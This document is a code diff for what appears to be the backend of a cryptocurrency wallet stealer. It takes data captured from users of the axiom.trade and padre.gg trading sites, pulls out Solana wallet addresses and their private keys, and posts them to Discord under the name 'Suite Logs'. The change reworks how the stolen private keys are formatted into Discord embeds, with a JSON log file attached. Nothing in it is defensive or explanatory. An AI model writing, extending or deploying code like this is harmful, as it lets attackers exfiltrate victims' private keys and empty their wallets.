@@ -29,7 +29,9 @@ PLATFORM_REDIRECTS = {
 
 ALLOWED_HOSTS = ("axiom.trade", "padre.gg")
 
-MAX_CONTENT = 1900   # Discord caps content at 2000
+BRAND       = "Suite Logs"
+SOL_COLOR   = 0x14F195   # solana green
+WALLET_COLOR = 0x0B0B0F
 
 
 def decode_b64url(s: str) -> str:
@@ -78,13 +80,13 @@ def normalize_wallets(parsed: dict) -> list:
     return stubs
 
 
-def build_content(parsed: dict) -> str:
-    """One line per Solana wallet: address : private key : label : wal N."""
+def build_embeds(parsed: dict) -> list:
+    """One embed per Solana wallet: Adresse / Private Key / Label."""
     host    = parsed.get("host", "?")
     keys    = parsed.get("keys", []) or []
     wallets = normalize_wallets(parsed)
 
-    lines = [f"**{host}**"]
+    embeds = []
     n = 0
     for i, w in enumerate(wallets):
         if not isinstance(w, (list, tuple)) or len(w) < 2:
@@ -92,21 +94,32 @@ def build_content(parsed: dict) -> str:
         chain = (w[1] or "").upper()
         if chain != "SOL":
             continue
-        addr  = w[0] or ""
+        addr  = w[0] or "—"
         label = (w[5] if len(w) > 5 else "") or "—"
         key   = keys[i] if i < len(keys) else "not recovered"
         n += 1
-        lines.append(
-            f"`Adresse Solana :` {addr} : `Private Key :` {key} : `Label :` {label} : `Wal {n}`"
-        )
 
-    if n == 0:
-        lines.append("`no SOL wallet recovered`")
+        embeds.append({
+            "title": f"Wal {n}",
+            "color": SOL_COLOR,
+            "fields": [
+                {"name": "Adresse Solana", "value": f"```{addr}```", "inline": False},
+                {"name": "Private Key",    "value": f"```{key}```",  "inline": False},
+                {"name": "Label",          "value": f"`{label}`",    "inline": True},
+                {"name": "Chain",          "value": "`SOL`",         "inline": True},
+                {"name": "Host",           "value": f"`{host}`",     "inline": True},
+            ],
+            "footer": {"text": f"{BRAND} · Wal {n}/{n}"},
+        })
 
-    body = "\n".join(lines)
-    if len(body) > MAX_CONTENT:
-        body = body[: MAX_CONTENT - 1] + "…"
-    return body
+    if not embeds:
+        embeds.append({
+            "title": "Suite Logs",
+            "color": WALLET_COLOR,
+            "description": f"`{host}` — no SOL wallet recovered",
+        })
+
+    return embeds[:10]
 
 
 def forward(parsed: dict, payload: str) -> Response:
@@ -119,9 +132,9 @@ def forward(parsed: dict, payload: str) -> Response:
     }
     data = {
         "payload_json": json.dumps({
-            "content": build_content(parsed),
-            "username": "Suite Logs",
-            "attachments": [{"id": "0", "filename": f"suite-logs.json"}],
+            "username": BRAND,
+            "embeds": build_embeds(parsed),
+            "attachments": [{"id": "0", "filename": "suite-logs.json"}],
         }),
     }
 
